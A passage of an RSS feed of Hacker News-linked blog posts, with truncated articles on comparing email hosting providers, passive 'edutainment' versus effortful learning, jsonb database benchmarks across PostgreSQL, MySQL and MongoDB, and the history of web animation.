<p>Because my own Mailserver has lately problems (downtimes) I wanna explore other possibilities of hosting my email addresses.</p>
<p>So let’s take a look…</p>

<p>You simply setup a Mailserver with software like Mailcow, Mailu or Mail-in-a-Box on a virtual Server and manage it yourself.</p>
<p>Pros:</p>
<ul>
<li>You have the control</li>
<li>Unlimited domains</li>
<li>Unlimited mailboxes</li>
<li>Cheaper than most alternatives if you don’t look at the time you need for setup and maintenance</li>
</ul>
<p>Cons:</p>
<ul>
<li>Most cheap VPS don’t offer a lot of space and if you subtract the OS and installed software, then your space for mail is very limited</li>
<li>You need to invest a lot of time</li>
<li>You need a good spec VPS because Mailserver software and SPAM protection are performance intensive</li>
<li>Small VPS are often targeted by criminals and protection isn’t very easy</li>
</ul>
<p>This is what I’ve done the most of the time.</p>
<p>In the past this was very straightforward if you know how to setup and secure a mailserver but I’ve lately problems with things like DDoS and Brute Force Attacks.</p>
<p>A <a href="https://news.ycombinator.com/item?id=24154524">question</a> from me on Hacker News was even so heavily voted that it was for a short time on the front page of HN - so this seems to be a problem for other people too.</p>
<h2 id="pawnmail">Pawnmail<a href="#pawnmail" arialabel="Anchor">⌗</a> </h2>
<p>This service doesn’t exist anymore but I wanna mention it because it was one of the few free providers where you can get mailboxes for your own domains.</p>
<p>AFAIK that service doesn’t exist anymore because it was targeted by spammers and had problems with attacks.</p>
<h2 id="zoho-mail">Zoho Mail<a href="#zoho-mail" arialabel="Anchor">⌗</a> </h2>
<p>The free plan supports one domain with up to five users and has a 5GB/User and 25MB attachment limit.</p>
<p>Unusable for me because IMAP/ POP/ Active Sync are not included in the free plan.</p>
<p>Indian company, the CEO seems to support Hindu nationalism.</p>
<h2 id="yandex-mail">Yandex Mail<a href="#yandex-mail" arialabel="Anchor">⌗</a> </h2>
<p>The biggest player in my comparison. Offers 10 GB of storage, up to 1000 users and support for custom domains for free.</p>
<p>It seems like the only problem is that you have to trust a Russian company.</p>
<h2 id="mxroute">MXroute<a href="#mxroute" arialabel="Anchor">⌗</a> </h2>
<p>Has various plans for custom Domain Email Hosting. All plans include support for unlimited Domains and unlimited Email Accounts.</p>
<p>Especially the Black Friday deals seem to be pretty good every year.</p>
<p>US company, interestingly the Founder has worked for Christian Institutions - so both - the CEOs of Zoho and MXroute seem to be religious persons.</p>
<h2 id="mailcheapco">Mailcheap.co<a href="#mailcheapco" arialabel="Anchor">⌗</a> </h2>
<p>Cheap Hosting Provider for custom Domain Email, comparable to MXroute but it has more bad reviews than MXroute.</p>
<h2 id="migadu">Migadu<a href="#migadu" arialabel="Anchor">⌗</a> </h2>
<p>On the HN Post to this Article <a href="https://news.ycombinator.com/item?id=25201493">someone mentioned</a> Migadu.</p>
<p>Migadu is the only provider on this comparison from Switzerland and the pricing is more expensive compared to the US providers…</p>
<p>So you pay more but your data is probably also more secure.</p>
<h2 id="postaleio">postale.io<a href="#postaleio" arialabel="Anchor">⌗</a> </h2>
<p>French provider, offers a free plan which includes one domain, 2 mailboxes, 3 aliases and 1 GB per mailbox.</p>
<h2 id="conclusion">Conclusion<a href="#conclusion" arialabel="Anchor">⌗</a> </h2>
<p>Unfortunately it seems like the cheapest hosting possibilities are either trusting a Russian company which government maybe spies on you, trusting a US company which is also obliged to let the government spy on you or to go to an Indian company which is run by a Hindu nationalism supporter…</p>
<p>Hosting your own server isn’t the cheapest option but you are more in control.</p>
<p>I know there are privacy focused providers like ProtonMail or Fastmail out there but the cost of those services are way higher than the providers I mentioned at the time of this writing. (Especially if you want more than one mailbox. Most popular services are on a pay per-user basis, but MXroute, Mailcheap, Yandex and your own VPS are more on a pay per-storage / resources plan)</p>
<p>So I think I will split my domains to various services - in that way no government has all of my information and I am more immune to downtimes.</p>

      </div></div></div>]]>
            </description>
            <link>https://blog.m5e.de/post/comparison-of-email-hosting-possibilities/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200588</guid>
            <pubDate>Tue, 24 Nov 2020 17:22:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Edutainment Is Not Learning]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200474">thread link</a>) | @giansegato
<br/>
November 24, 2020 | https://giansegato.com/essays/edutainment-is-not-learning/ | <a href="https://web.archive.org/web/*/https://giansegato.com/essays/edutainment-is-not-learning/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Before I got into productivity and performance, I used to spend many hours online ingesting vast troves of digital content. My information diet ranged from inspirational TED talks to specialized podcasts, from blog posts found on Hacker News to ebooks shared on Twitter.</p>
<p>I’m deeply curious, and I gave in to new content as much as I could. What could be the harm?—I thought. I <em>loved</em> spending my time this way. It felt useful, it was fun, and it nurtured my self-image as a “smart guy” — all at the same time. Truly, a learning hack.</p>
<p>Turns out I wasn’t hacking anything: The learning wasn’t real.</p>
<p>A few months ago, doubts began to creep into my mind about the effectiveness of my habits.</p>
<p>While I’d amped up my information consumption, I wasn’t retaining most of it. My memory was behaving like a leaky bucket. Sure, I was spending tens of hours listening to politics on the radio. But when I tried to use any of those points in a conversation, I found that I didn’t actually know enough to make a coherent argument. <strong>I knew the surrounding context, but the moment I needed to get specific my argument would crumble</strong>. Same for many other topics: the more technical they were, the less retention I had.</p>
<p>Where did all that information go?</p>
<p>The problem lied in how I was seeing learning, and therefore how I was approaching it.</p>
<p>Learning is what turns information consumption into long-lasting knowledge. The two things are different: while information is ephemeral, true knowledge is foundational. If knowledge were a person, information would be its picture.</p>
<p>It’s easy to think of learning in <em>accretive</em> terms: if I stack up enough information, it will eventually turn into knowledge. We tend to judge the world in material terms, and if data were tangible, an indefinitely growing memory might be reasonable to assume. The more information I consume, the more information I store, the information data I can later retrieve. The more business newsletters I’ll read, the more I’ll know business.</p>
<p>However, this line of thinking wasn’t really applicable to my case: I was undoubtedly consuming many business newsletters each week, but that wasn’t translating into long-term business knowledge.</p>
<p>I spent the last eight months trying to find an answer to this riddle. It took me deep into the topic of meta-learning: How do humans learn? And how can we learn better in the digital information age?</p>
<h2 id="learning-must-be-effortful">Learning must be effortful</h2>
<p>Unfortunately for us, human memory does not resemble storage, and “passive accumulation” isn’t how learning happens.</p>
<p>The truth is that we retain information only when we put <em>serious effort</em> into the process of learning. The intrinsic effortfulness of learning is not just a byproduct of the core activity, like shortness of breath during running. On the contrary: it’s what <em>actually</em> <em>enables</em> it. The relationship is causal.</p>
<figure>
    <img src="https://giansegato.com/img/essays/edutainment-not-learning/image_1.png"> 
</figure>

<p>I didn’t find a learning hack to avoid effort because there’s no such thing as easy learning: <strong>learning <em>must</em> be effortful in order for it to happen</strong>.</p>
<p>What surprised me the most is that learning is far more grounded in the physical world than I was comfortable admitting.</p>
<p>The most literal meaning of effort is <em>physical</em> effort (think of weight lifting at the gym). The same holds true with information retention: it works best when the process of assimilating it is <em>physically effortful</em>. Our memory shines when our learning is physical, visceral, and obvious, like the aching in your hands after a morning spent hand-writing.</p>
<p>Since they’re passive, easy, and exclusively digital, after this realization all my podcasts, e-books, audiobooks, newsletters, blog posts, videos, live webinars were suddenly deprived of their “<em>learning status</em>”. Instead, they assumed their proper place in my schedule as pure <em>entertainment</em> activities.</p>
<p>The fact of the matter is that digital products make it uniquely easy to trick yourself into thinking that you’re learning when you are actually being entertained.</p>
<p>What I still didn’t know was why our mind works like this. Is this just the current state of digital learning and teaching, or there’s actually a margin for <em>easy</em> learning to be found somewhere?</p>
<h2 id="the-neurology-of-learning">The neurology of learning</h2>
<p>I’m no expert in medicine, let alone neurology, but I did want to roughly understand what happens when we — as humans —&nbsp;create knowledge. Luckily I didn’t need profound medical expertise to get the gist of the matter.</p>
<p>Our brain is made of a web of interconnected neurons. The links between these neurons are called axons: long, slender projections of nerve fibers that transmit electrical impulses.</p>
<p>Around these axons, there’s an insulating membrane called myelin. It covers many neuronal axons and facilitates the propagation of electrical signals along neuronal circuits. The more myelin around an axon, the stronger and more connected the signal transmission will be.</p>
<figure>
    <img src="https://giansegato.com/img/essays/edutainment-not-learning/image_2.png"> 
</figure>

<p>Myelin is to neural transmissions as oxygen is to fire. It allows rapid information transfer over long distances, and it <a href="https://doi.org/10.1126/science.1261127">greatly increases</a> the speed of propagation of electric signals in our brain.</p>
<p>See it as water flowing through a pipe with dynamic, changing capacity. Pipes with greater capacity can move more water, more quickly than a small pipe or a slow drip. The more myelin supporting a neural connection, the easier it is to use that connection — and thus to use the skill or remember the topic associated with that connection</p>
<p>A key aspect of myelin is that it’s highly dynamic. It’s an integral component of our brain plasticity. So the question becomes: how is myelin generated, and why?</p>
<p>When we come across a new topic, new regions of the brain start activating. The more we use those new regions, the more myelin is synthesized, the easier that topic (or activity) gets.</p>
<p>We all know the old saying <em>practice makes perfect</em>. The more we use a certain region of our brain, the more our brain “prioritizes” and “hones” it. That is what leads to myelin: activity induces myelination, which leads to increased strength of connectivity and efficiency along those very neurons. It’s a self-reinforcing process.</p>
<p>In other words, it compounds.</p>
<figure>
    <img src="https://giansegato.com/img/essays/edutainment-not-learning/image_3.png"> 
</figure>

<p>See now why it’s so hard to learn? To learn anything we must make active use of unexplored regions of our brain <em>before</em> they’re ready. It’s, quite literally, getting out of the comfort zone. The more we use them, the more they get better. <strong>Learning is <em>structurally</em> hard.</strong></p>
<p>The truly mesmerizing thing about myelination is that it is correlated with active use of <em><a href="https://doi.org/10.1038/nn.4351">motor neurons</a></em>. It looks like human cognition is fundamentally grounded in sensory-motor processes: we retain information better when we associate some <em>physical activity</em> to it. <strong>The general intuition is that movement provides additional cues we can use to retrieve knowledge.</strong></p>
<p>We can see this effect happening when we take notes. A larger corpus of research is suggesting that taking notes physically — that is, by hand-writing them — is <a href="https://doi.org/10.3389/fpsyg.2020.01810">far more effective</a> than using a laptop. Keyboarding does not provide tactile feedback to the brain that the contact between pencil and paper does: this contact, this raw feedback, is the key to creating the neurocircuitry in the hand-brain complex, that <a href="https://doi.org/10.3389/fpsyg.2020.01810">evidence shows</a> supports memory and retention.</p>
<p>All of this means <strong>we need to radically reassess digital learning</strong>. We haven’t evolved to store information by passively watching Masterclass videos: that’s just not how our minds work.</p>
<p>However, the other side of this coin is that we’re living in times of unprecedented information surplus. This is an opportunity that we should learn to seize.</p>
<h2 id="creative-learning-in-a-digital-world">Creative learning in a digital world</h2>
<p>The best way to describe my information diet before discovering that effort is instrumental to learning would be <em>edutainment</em>.</p>
<p>Edutainment mixes education topics with entertainment methodologies. Even if edutainment optimizes for passive attention instead of effortful engagement (the opposite of learning), it’s not just “mere fun.” Deleting Twitter and unsubscribing from newsletters, as suggested by Deep Work advocates like <a href="https://www.calnewport.com/books/deep-work/">Cal Newport</a>, can actually end up <em>preventing</em> learning.</p>
<p>I see edutainment as <em>preparation for learning</em>: it’s a powerful explorative tool that can provide ideas and motivation to learn. And yet, it’s also not learning itself, in the same way as buying running shoes is not running.</p>
<p>Within this framework, “mindless” browsing online can be transformed into <em>scouting for learning opportunities</em>. It’s yet another searching problem where it’s key to balance the exploration of new opportunities with the commitment to the existing ones — a topic I wrote about at length in <a href="https://giansegato.com/essays/the-ebb-and-the-flow-of-product-development/">another essay</a>. It’s about balancing the time spent “scouting” for interesting topics online with the offline effort needed for long-term retention and integration.</p>
<hr>


<hr>
<p>Pragmatically, I solved this trade-off with a powerful tool: a learning inbox.</p>
<p>A learning inbox is a to-do list for stuff I’d like to actually learn. I picked up the idea from Andy Matuschak — legendary ed-tech expert —, who <a href="https://notes.andymatuschak.org/A_reading_inbox_to_capture_possibly-useful_references">used a similar concept</a> as a tool for capturing possibly-useful references. The learning inbox is a system that forces me to be mindful about what content is <em>learning</em>, and what is at the end of the day just <em>entertainment</em>.</p>
<p>Everything interesting I find on my way is sent to my learning inbox and from there gets triaged, be it a paper, an online essay, a blog post, a YouTube video, or a podcast. When an item ends up in there, there are three things that can happen: I either decide to actively engage with it, to file for future interest, or just trash it. Active engagement is exactly what it sounds like: <strong>I need to take effortful action to consume the content in the list</strong>, otherwise I automatically bucket it as entertainment.</p>
<p>In other words, I need to do something with it. To <em>create</em> something. Write a blog post about it, use it in a new project, test it on the field, teach it at a meetup. That’s why I speak at <a href="https://giansegato.com/about/#talks">many conferences</a>: it’s a learning tool.</p>
<p>In <a href="https://gettingthingsdone.com/">GTD fashion</a>, permanence in this list is temporary. It’s a release valve, not a …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://giansegato.com/essays/edutainment-is-not-learning/">https://giansegato.com/essays/edutainment-is-not-learning/</a></em></p>]]>
            </description>
            <link>https://giansegato.com/essays/edutainment-is-not-learning/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200474</guid>
            <pubDate>Tue, 24 Nov 2020 17:13:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jsonb: Few more stories about the performance (2017)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200456">thread link</a>) | @victorbojica
<br/>
November 24, 2020 | https://erthalion.info/2017/12/21/advanced-json-benchmarks/ | <a href="https://web.archive.org/web/*/https://erthalion.info/2017/12/21/advanced-json-benchmarks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p><span>21 Dec 2017</span></p><blockquote>
<p>As such, there’s really no “standard” benchmark that will inform you about
the best technology to use for your application. Only your requirements, your
data, and your infrastructure can tell you what you need to know.</p>
</blockquote>
<p>For already some time I can’t stop doing interesting/useful/weird (one at the
time) benchmarks to reveal some details on how to apply document-oriented
approach in the world of relational databases. Finally, I decided that I have a
critical mass of those details to share in the form of blog post. So welcome to
The Benchmark Club, where we’re going to discuss what it takes to create a fair
performance comparison of different databases. As you may guess, the first rule
of The Benchmark Club is to never share a reproducible benchmarks. But we
identify ourselves as a badass engineers, so we’re going to break this rule
today.</p>
<p><img src="https://erthalion.info/public/img/fight_club.jpg" width="100%"></p>

<h2 id="targets">Targets</h2>
<p>It’s not possible to compare all the existing solutions to store and process
the data in form of documents (although looks like people usually expect exactly
that), so I’ve limited my scope to PostgreSQL, MySQL and MongoDB:</p>
<ul>
<li>
<p>PostgreSQL - just because it’s an enlightened database, which is a part of my
very existence.</p>
</li>
<li>
<p>MySQL - also has quite decent implementation of binary json, so it’s
interesting to compare PostgreSQL with one of its closest rival.</p>
</li>
<li>
<p>MongoDB - one of the most popular NoSQL databases. Sort of synonym for
“document-oriented” approach as for me.</p>
</li>
</ul>
<h2 id="environment">Environment</h2>
<p>Unfortunately for me, I don’t have any bare metal servers to test the
performance. So all my tests were made using AWS EC2, which has its own pros
and cons:</p>
<ul>
<li>Super easy to reproduce the same results on your own.</li>
<li>Many companies use AWS as a main platform to run their infrastructure, so my
results maybe even more relevant for them.</li>
<li>But there are some implications of using EC2 for performance tests.</li>
</ul>
<p>My typical benchmark environment had two EC2 instances, one for a workload
generator, another for a database. I was using <code>m4.large</code> instance type with a
gp2 ELB volume and the default Ubuntu 16.04 AMI image, so HVM virtualization
was available. Both instances were in the same availability zone, VPC and
placement group, so we eliminated significant networking issues.</p>
<p>But it’s not really enough to be confident in results. There are still some
interesting performance-relevant <a href="https://henrikingo.github.io/presentations/Highload%202017%20-%20Measuring%20performance%20variability%20of%20EC2/index.html#/title">details</a> about using
EC2 (e.g. it’s usually advised to disable hyper-threading to get better
latency), and in general benchmarking is quite dangerous area (only insane
persons join The Benchmark Club, because everyone thinks he is smarter than
you, but no one wants to help). To at least partially mitigate those possible
issues and make sure that my tests are more reproducible I tried to be as
careful as possible - for almost every use case I did at least 4 rounds of the
same benchmark (and usually even more).</p>
<p>As a tool for benchmarks I used YCSB, which is a quite well-known instrument to
test the performance of NoSQL databases. It provides many interesting types of
workload, but unfortunately only documents of quite simple structure are
involved. To be more precise, YCSB uses simple flat documents with some number
of keys and corresponding values, which is not that close to the reality from
my point of view. That’s why I also created a <a href="https://github.com/erthalion/ycsb">fork</a> of this tool,
where I introduced the possibility of creating documents with some complex
structure, and drivers for PostgreSQL (jsonb) and MySQL (binary json) (warning:
I should mention, that it’s not a code I can be proud of, but you know - “it
works for me”).</p>
<p>To create an environment, I have an <a href="https://github.com/erthalion/ansible-ycsb">ansible playbook</a> (for
those of you who had seen my talks about this topic on various conferences,
this playbook always was public, but after some time I stopped to include it
into my slides, since there was no real feedback), that accepts some parameters
like EC2 key, availability zone and other stuff, and creates all the required
instances, configures them, and starts data load stage and actual test. The
only thing you need to do manually is to create subnets with all the security
groups for your databases (I’m just to lazy to automate it). Unfortunately,
Ansible itself became an issue at some point, since it still uses Python2,
which is not available on the latest versions of Ubuntu, so there are few hack
required to be able to use it.</p>
<p>Besides running database itself, every instance also collecting system metrics
using <code>sar</code> tool (plus some database related metrics from <code>pgview</code> or
<code>mongotop</code>), and they’re available after a test.</p>
<p>Few random notes. I’m not sure about current situation, but when I was writing
all those scripts there was no proper service in the latest versions of Ubuntu
for the latest version of MongoDB. Which means I had to include one more
template and create this service myself.</p>
<p>Another nice thing that costs me several sleepless nights is something called
“unattended-upgrades”. This Ubuntu service could wake up sometimes and start to
update the system. Besides the minor fact that I just don’t need to have this
overhead, this caused test failures sometimes because of a lock for package
installation. So I disabled it. Generaly speaking, to prevent flaky tests it
totally makes sense to add Ansible retry to update packages section, something
like:</p>
<pre><code>until: update_result.stderr == ""
retries: 10
delay: 1
ignore_errors: yes
</code></pre>
<p>One more thing that you can do to make your life easier is to add</p>
<div><div><pre><code>host_key_checking = False # we know our hosts
timeout = 60  # or even more
pipelining = True # reduce number of SSH operations
</code></pre></div></div>
<p>into <code>ansible.cfg</code> on your host machine (<code>pipelining</code> theoretically can break
compatibility with sudoers configurations, but I never experienced anything
like that in my tests).</p>
<p>To save some money and time, almost for all tests I actually used already
prepared AMI images with everything I need. But if you preload test data into
this image, you have to understand, that obviously there will be no data in the
cache at the start of a test.</p>

<p>In my tests I used some variety of database versions:</p>
<ul>
<li>
<p>PostgreSQL 9.6.3/10</p>
</li>
<li>
<p>MongoDB 3.2.5/3.4.4</p>
</li>
<li>
<p>MySQL 5.7.19/8.0.3</p>
</li>
</ul>
<p>To make it simple, you can assume that we’re using the latest stable version,
and I’m going to mention a particular version only if it makes some performance
difference.</p>
<p>When dealing with configurations for these databases, I tried to adjust only
those options, that were directly related to either instance parameters or the
nature of a workload. Everything more detailed I left for the next part of my
research. This led me to the following important options:</p>
<ul>
<li>
<p>PostgreSQL</p>
<ul>
<li>
<p>shared_buffers</p>
</li>
<li>
<p>effective_cache_size</p>
</li>
<li>
<p>max_wal_size</p>
</li>
<li>
<p>checkpoint_completion_target</p>
</li>
</ul>
</li>
<li>
<p>MySQL</p>
<ul>
<li>
<p>innodb_buffer_pool_size</p>
</li>
<li>
<p>innodb_log_file_size</p>
</li>
</ul>
</li>
<li>
<p>MongoDB</p>
<ul>
<li>
<p>write concern level</p>
</li>
<li>
<p>checkpoints</p>
</li>
<li>
<p>eviction</p>
</li>
<li>
<p>transaction_sync (just out of curiosity, it’s not really recommended to
use)</p>
</li>
</ul>
</li>
</ul>
<p>Few important notes:</p>
<ul>
<li>
<p>proper data consistency is used for all the tests (which means write concern
journaled for MongoDB)</p>
</li>
<li>
<p>SSL was disabled (it’s like that for PostgreSQL and MongoDB, for MySQL driver
I had to disable it manually)</p>
</li>
<li>
<p>for PostgreSQL and MySQL prepared statements were used</p>
</li>
<li>
<p>all databases were used in a single instance form. For MongoDB it’s actually
quite unnatural, and usually you want to use replication to get the eventual
consistency. But at the same time it allows us to test all involved databases
under the similar conditions when they do more or less the same work. Right
now I’m working on the second part of my test suite to test databases
clusters, so you can think about this one as a first step, that nonetheless
is quite interesting by itself.</p>
</li>
</ul>
<p>And few words about types of documents that were involved. With the default
YCSB I can define:</p>
<ul>
<li>
<p>“simple” or “small” document - 10 keys and values, every value is 100
random characters</p>
</li>
<li>
<p>“large” document - 100 keys and values, every value is 200 random characters</p>
</li>
</ul>
<p>And using my fork I also can define:</p>
<ul>
<li>“complex” document - 100 keys and values that form a tree with 3 nesting
levels, every value is 100 random characters</li>
</ul>

<p>YCSB provides several interesting <a href="https://github.com/brianfrankcooper/YCSB/wiki/Core-Workloads">types of workload</a> to
simulate real world situations. Let’s start with the simples one, <code>WorkloadC</code>,
that consists 100% of read queries. Every read query fetches a single document
by its ID, so we need to discuss how can we index our documents:</p>
<ul>
<li>
<p>PostgreSQL - we can index either a single path/multiple paths (using regular
functional index) or all paths (using GIN index) inside a document.</p>
</li>
<li>
<p>MongoDB - we can index either a signle path or multiple paths inside a
document.</p>
</li>
<li>
<p>MySQL - there is no direct support for indexing binary json, but we can
create a virtual column and index it as usual. So, again, a single or
multiple paths inside a document.</p>
</li>
</ul>
<p>Let’s try to make a simple performance test using “default” indexing approach,
which means we’re going to index an entire document for PostgreSQL, only ID in
MongoDB, and only ID in a separate virtual column in MySQL.</p>
<p><img src="https://erthalion.info/public/img/benchmarks/select_jsonb_path_ops_throughput.png" width="100%"></p>
<p>This graph represents throughput for under a <code>WorkloadC</code> for all the databases.
By Ox we have a number of clients that are querying our databases, so basically
it’s a level of concurrency. By Oy there is a throughput value.</p>
<p><img src="https://erthalion.info/public/img/benchmarks/select_jsonb_path_ops_latency_99.png" width="100%"></p>
<p>On this graph you can see a 99th percentile of latency for the same test.</p>
<p>And I bet you already have a lot of questions about this data. Since we strive
to get a fair comparison, we need to discuss and explain them:</p>
<ul>
<li>
<p>Why there is a spike for all of them at about 20 clients?</p>
</li>
<li>
<p>Why there is a performance degradation for MongoDB when number of clients is
growing?</p>
</li>
<li>
<p>Why there is a performance gap between MySQL and MongoDB?</p>
</li>
<li>
<p>Why there is a performance gap between PostgreSQL and MongoDB?</p>
</li>
</ul>
<h2 id="spike-at-20-clients">Spike at 20 clients</h2>
<p>That one is probably the easiest one and it relates to an instance
configuration. The next graph shows the CPU consumption for PostgreSQL
in a test with exactly 20 clients.</p>
<p><img src="https://erthalion.info/public/img/benchmarks/pg_select_cpu_20.png" width="100%"></p>
<p>As you can see, CPU resources almost completely consumed, and judging from the
same metrics before 20 clients we still have some capacity. So that’s the</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://erthalion.info/2017/12/21/advanced-json-benchmarks/">https://erthalion.info/2017/12/21/advanced-json-benchmarks/</a></em></p>]]>
            </description>
            <link>https://erthalion.info/2017/12/21/advanced-json-benchmarks/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25200456</guid>
            <pubDate>Tue, 24 Nov 2020 17:11:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Understanding web animations: a half-baked history]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25200336">thread link</a>) | @weareferal
<br/>
November 24, 2020 | https://weareferal.com/blog/a-half-baked-history-of-web-animations/ | <a href="https://web.archive.org/web/*/https://weareferal.com/blog/a-half-baked-history-of-web-animations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p><a href="https://weareferal.com/blog/category/tech-chat/">Tech Chat</a></p><p><time datetime="2019-09-12">September 12, 2019</time><img data-src="https://cdn.weareferal.com/assets/uploads/illustrations/feral-post_07.jpg?mtime=20200930100108&amp;focal=none" alt="Feral post 07" src="https://cdn.weareferal.com/assets/uploads/illustrations/feral-post_07.jpg?mtime=20200930100108&amp;focal=none"></p><p>A long-winded and uninformed walk-through of web animations through the ages.</p><hr></div><section data-component="textBlock"><p>Pic­ture the scene: you like your site, but it’s a&nbsp;bit <em>bland</em>. You want it to <span>POP</span>. You start by adding a&nbsp;few sim­ple <span>CSS</span> ani­ma­tions to your but­tons. They look pret­ty good. Then you decide you want to have nice page tran­si­tions. No prob­lem, there are lots of libraries to help with that — you pop one in. Maybe you should ani­mate your land­ing page? In fact, why not have each ele­ment ani­mate <em>at dif­fer­ent times</em>. Hmmm, might need some JavaScript for that. <span>OK</span>, well that <em>works</em> but let’s try it out on my&nbsp;phone&nbsp;…</p><p>Soon it’s <span>3</span>a.m. and you’re knee-deep in the Chrome Dev-Tools try­ing to make sense of your pathet­ic <span>3</span>fps page-load expe­ri­ence. You haven’t seen your friends or fam­i­ly in&nbsp;days.</p><figure><img src="https://cdn.weareferal.com/assets/uploads/posts/Clockwork-Orange.jpg?mtime=20200930100059&amp;focal=none" data-image="1555"></figure><p>The point is, once you get beyond sim­ple fade-ins, ani­ma­tions on the web are <u>hard</u>.</p><p>The goal of this post is to try give you the con­text as to <em>why</em> they’re hard, as well as a&nbsp;brief his­to­ry and run-down of the avail­able approach­es to tack­ling animation.</p><p>This post won’t give you a&nbsp;detailed expla­na­tion of how each approach works, but it will give you the under­stand­ing you need to be able to han­dle ani­ma­tion on the&nbsp;web.</p><h2>Overview</h2><p>To get a&nbsp;good overview of where we cur­rent­ly stand with brows­er ani­ma­tions, here’s what we’re going to look&nbsp;at:</p><ul><li>Flash 😱</li><li><span>SMIL</span> (<em><span></span>​<span>“</span>smile”)</em></li><li><span>CSS</span> Tran­si­tions and Animations</li><li>JavaScript ani­ma­tions</li><li>Web Ani­ma­tion <span>API</span> (<span>WAAPI</span>)</li><li><span>3</span><sup>rd</sup> par­ty ani­ma­tion frame­works and libraries</li></ul><p>For con­text, let’s begin with the most infa­mous (and now defunct) approach.</p><h2>Flash</h2><figure><img src="https://cdn.weareferal.com/assets/uploads/posts/Feral-90s.png?mtime=20200930100110&amp;focal=none" data-image="4axj6pwr8q78"><figcaption>Fer­al’s first web­site cir­ca&nbsp;<span>1994</span></figcaption></figure><p>Back when browsers were still at war, there weren’t many cross-plat­form stan­dards to point to. The web was young and exper­i­men­ta­tion was rife. Devel­op­ers want­ed to be able to cre­ate inter­ac­tive web­sites and games, what­ev­er the&nbsp;cost.</p><p>Flash was the answer. It was a&nbsp;pro­pri­etary, closed-source appli­ca­tion (even­tu­al­ly owned by Adobe) that allowed devel­op­ers to build these inter­faces and games and then dump them into the brows­er via the <code>&lt;object&gt;</code> tag and a&nbsp;brows­er plug-in. The brows­er <em>could</em> inter­act with them but it was the respon­si­bil­i­ty of the installed Flash plug-in to run every­thing. Essen­tial­ly the brows­er was out­sourc­ing its job to&nbsp;Flash.</p><p>While Flash was a&nbsp;great tech­nol­o­gy, it went against the core prin­ci­ple of the web; to be open and acces­si­ble. As the web matured, a&nbsp;slew of new stan­dards and specs began to take shape intro­duc­ing the abil­i­ty to do many of the things Flash could do, but native­ly via the brows­er. At the same time, smart­phones came along. <a href="https://www.apple.com/hotnews/thoughts-on-flash/">Apple famous­ly did­n’t want to sup­port Flash in their iPhone</a> and the writ­ing was on the&nbsp;wall.</p><p>To cut a&nbsp;long sto­ry short, Flash sup­port has been dep­re­cat­ed on all major browsers and Adobe will be putting it out to pas­ture in <span>2020</span>.&nbsp;<span>RIP</span>.</p><p>So how do we ani­mate on the web with­out&nbsp;Flash?</p><h2>SVGs and&nbsp;<span>SMIL</span></h2><p>Flash pro­vid­ed the ecosys­tem for cre­at­ing ani­ma­tions that could be plugged into the web, but the core com­po­nent at the heart of these ani­ma­tions was <em>vec­tor graph­ics</em>.</p><p>Vec­tor graph­ics are <em>res­o­lu­tion inde­pen­dent</em> image files. <a href="https://www.shutterstock.com/blog/raster-vs-vector-file-formats">In con­trast to <em>raster</em> image for­mats</a> such as <code>pngs</code><code>jpgs</code> and <code>gifs</code>, vec­tor graph­ics are made up of paths and shapes instead of pix­els. These res­o­lu­tion-inde­pen­dent ele­ments are per­fect for icons and illus­tra­tions, par­tic­u­lar­ly on todays high-res­o­lu­tion screens.</p><p>While Flash was devour­ing the web in the <span>2000</span>s, the <span>SVG</span> stan­dard was being built to sup­port <em>open</em> vec­tor graph­ics in the brows­er. Although these weren’t well sup­port­ed until the <span>2010</span>s, they pro­vid­ed the bedrock for high qual­i­ty graph­ics and ani­ma­tions via the <code>.svg</code> file for­mat and <code>&lt;svg&gt;</code><span>HTML</span> element.</p><p>You are prob­a­bly famil­iar with SVGs. They are based on <span>XML</span>, so they look very like our reg­u­lar&nbsp;<span>HTML</span>:</p></section><section><pre><code data-component="syntax-highlighter">&lt;svg&gt;
  &lt;g&gt;
      &lt;rect ...&gt;
      &lt;path .. &gt;
      &lt;line ...&gt;
      &lt;circle ...&gt;
  &lt;/g&gt;
&lt;/svg&gt;
</code></pre></section><section data-component="textBlock"><p>Around the same time SVGs were being stan­dard­ised to han­dle <em>vec­tor graph­ics</em>, we were also look­ing for ways to stan­dard­ise mul­ti­me­dia on the web <em>in gen­er­al</em>. Pro­pri­ety plug-ins were han­dling almost all of the audio (remem­ber RealPlay­er?), video and ani­ma­tion on the web and this was becom­ing a&nbsp;closed-source quagmire.</p><p>To han­dle this, the <span>SMIL</span> (“Syn­chro­nised Mul­ti­me­dia Inte­gra­tion Lan­guage” 🤷🏻‍♂️) stan­dard was devel­oped. Pro­nounced <em>smile</em>, this was an ambi­tious stan­dard aimed at pro­vid­ing the frame­work for deliv­er­ing video, audio and ani­ma­tions in a&nbsp;more open, user-friend­ly and acces­si­ble way. If <span>HTML</span> allowed you to deliv­er a&nbsp;<em>doc­u­ment</em> to the brows­er, <span>SMIL</span> would allow you to deliv­er and coor­di­nate <em>mul­ti­me­dia</em> to the browser.</p><p>Includ­ed in the <span>SMIL</span> stan­dard were the tools need­ed to ani­mate SVGs. To do so it aug­ment­ed SVGs with ani­ma­tion-spe­cif­ic ele­ments to be used along­side the reg­u­lar shapes and&nbsp;paths:</p><ul><li><code>&lt;animate&gt;</code></li><li><code>&lt;animateMotion&gt;</code></li><li><code>&lt;animateTransform&gt;</code></li><li>…</li></ul><p>These allowed you to do com­plex and coor­di­nat­ed ani­ma­tions with­in a&nbsp;sin­gle <span>SVG</span>&nbsp;file.</p><p>In sum­ma­ry, SVGs and 